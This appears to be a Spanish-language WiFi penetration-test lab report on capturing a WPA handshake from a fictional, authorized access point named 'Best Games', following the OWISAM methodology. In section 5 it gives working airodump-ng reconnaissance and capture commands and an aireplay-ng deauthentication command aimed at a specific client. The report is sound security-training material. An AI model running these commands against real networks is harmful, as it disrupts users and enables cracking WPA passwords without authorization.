Informe de auditoría WiFi: Best Games

Tipo: pentesting externo, caja negra, sobre una red WiFi ficticia y autorizada.

Regla de alcance: ejecutar únicamente contra el punto de acceso, cliente y archivos de captura creados para este laboratorio. No probar redes detectadas por proximidad.

1. Resumen ejecutivo

Se documenta la captura de un 4-way handshake de una red ficticia asociada a Best Games dentro de un entorno autorizado. El propósito es registrar el procedimiento técnico, no obtener acceso a una red real.

2. Objetivos

  • Identificar el SSID, BSSID, canal y cifrado del AP de laboratorio.
  • Capturar un handshake mediante la reconexión de un cliente propio.
  • Documentar el procedimiento y las evidencias de captura.

3. Metodología

Se adopta OWISAM, Open Wireless Security Assessment Methodology, como referencia para reconocimiento, identificación de controles inalámbricos, captura autorizada y validación de autenticación. Referencia: owisam.org. El ejercicio es externo porque el auditor solo observa y prueba la superficie inalámbrica desde fuera del AP, sin acceso administrativo al router.

4. Preparación reproducible

Parámetros de captura: BSSID del AP 82:18:48:75:E3:76; MAC del cliente propio 7A:4C:91:2E:B7:08. La plataforma y la interfaz inalámbrica están documentadas en hardware_software-laboratorio.md.

5. Ejecución

5.1 Reconocimiento autorizado

sudo airodump-ng wlan1mon

Registrar solamente el AP autorizado del laboratorio: BSSID 82:18:48:75:E3:76 y cliente propio 7A:4C:91:2E:B7:08.

5.2 Captura del handshake

Con sudo airodump-ng -c 11 --bssid 82:18:48:75:E3:76 wlan1 -w pruebared corriendo, en otra ventana de la terminal se desautentica al cliente con sudo aireplay-ng -0 9 -a 82:18:48:75:E3:76 -c 7A:4C:91:2E:B7:08 wlan1.

La captura se registra en pruebared-01.cap y se debe verificar la aparición de WPA handshake antes de detener el proceso.

Captura asignada: handshake-82-18-48-75-E3-76.cap, con SSID Best Games. Conservar el archivo fuera de Git y registrar la aparición del mensaje WPA handshake.
